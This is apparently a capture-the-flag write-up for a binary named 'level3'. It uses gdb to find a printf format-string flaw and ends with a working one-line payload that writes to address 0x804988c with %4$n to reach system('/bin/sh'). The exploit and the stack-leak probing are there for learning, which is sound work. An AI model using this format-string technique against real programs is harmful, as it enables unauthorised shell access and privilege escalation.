./level3
>qsdqsdqsdqsd
>qsdqsdqsdqsd

So level3 take a string and print it. By using gdb `b main; run; layout`
We can see the main function only contains a call to `v` function.
`b v; n;` With the layout of gdb we can see that `v` calls `fgets` (man fgets).
Then call `printf`, eax is set the value of some pointer value than it's compared to **0x40** (64). If it's egal `system` will be called with "/bin/sh"

So the return value of `printf` is not stored but a comparaison is being made and we want this comparaison to be true.

https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b

We will exploit `printf %n` vulnerability. **0x804988c** is the value we want to change.

Last thing we need to do is locate where **0x804988c** is in the stack order to modify it.

By messing around with the memory:
./level3
>AAAA%p %p %p **%p** %p %p
>AAAA0x200 0xb7fd1ac0 0xb7ff37d0 __0x41414141__ 0x25207025 0x70252070

we can see **0x41414141** in base 16, witch is 65 and according to ascii it's A
So the forth variable is where we will attack.

`(python -c 'print("\x8c\x98\x04\x08" + "a" * 60 + "%4$n")'; cat) | ./level3`

and boom we're in the system (the function haha)